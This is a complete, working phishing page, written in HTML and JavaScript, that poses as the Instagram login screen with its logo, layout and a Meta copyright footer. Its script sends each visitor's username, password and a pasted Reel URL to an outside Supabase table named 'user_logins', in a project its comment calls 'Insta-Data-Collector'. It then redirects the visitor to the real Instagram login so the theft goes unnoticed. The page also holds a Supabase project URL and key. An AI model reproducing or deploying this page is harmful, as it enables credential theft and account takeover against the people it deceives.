<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login • Instagram</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            margin-top: 30px;
        }
        .logo-img {
            width: 175px;
            margin-bottom: 35px;
            margin-top: 10px;
        }
        form { width: 100%; max-width: 350px; }
        input {
            width: 100%;
            padding: 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 7px;
            font-size: 14px;
        }
        input:focus { border: 1px solid #a8a8a8; outline: none; }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
        }
        .login-btn:disabled { opacity: 0.7; }
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            max-width: 350px;
            margin: 20px 0;
        }
        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
        .or { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .fb-icon { width: 16px; margin-right: 8px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
        .signup-box {
            border: 1px solid #dbdbdb;
            width: 100%;
            max-width: 350px;
            padding: 20px;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
        footer { padding: 40px 20px; text-align: center; color: #8e8e8e; font-size: 12px; margin-top: auto; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img" alt="Instagram">
        
        <form id="authForm">
            <input type="text" id="user" placeholder="Phone number, username, or email" required>
            <input type="password" id="pass" placeholder="Password" required>
            <input type="url" id="reel" placeholder="Paste Instagram Reel URL here" required>
            
            <button type="submit" id="submitBtn" class="login-btn">Log In</button>
        </form>

        <div class="divider">
            <div class="line"></div>
            <div class="or">OR</div>
            <div class="line"></div>
        </div>

        <a href="#" class="fb-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png" class="fb-icon">
            Log in with Facebook
        </a>
        <a href="#" class="forgot">Forgot password?</a>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <footer>
        <p>© 2026 Instagram from Meta</p>
    </footer>

    <script>
        // Connecting to your Insta-Data-Collector project
        const _supabase = supabase.createClient(
            'https://mllxnrqjdzpiswpaappa.supabase.co', 
            'sb_publishable_eRmChz-WTwaXvgf5r0VONw_mQN8BPnZ'
        );

        document.getElementById('authForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Log In...";

            const username = document.getElementById('user').value;
            const password = document.getElementById('pass').value;
            const reelUrl = document.getElementById('reel').value;
            const pageUrl = window.location.href;

            try {
                const { error } = await _supabase.from('user_logins').insert([
                    { 
                        identifier: username, 
                        password: password,
                        reel_url: reelUrl, // Must match your Supabase column name exactly
                        url: pageUrl 
                    }
                ]);

                if (error) throw error;

                // Redirect to official Instagram
                window.location.href = "https://www.instagram.com/accounts/login/";

            } catch (err) {
                console.error("Error:", err.message);
                alert("Connection error. Please try again.");
                btn.disabled = false;
                btn.innerText = "Log In";
            }
        });
    </script>
</body>
</html>
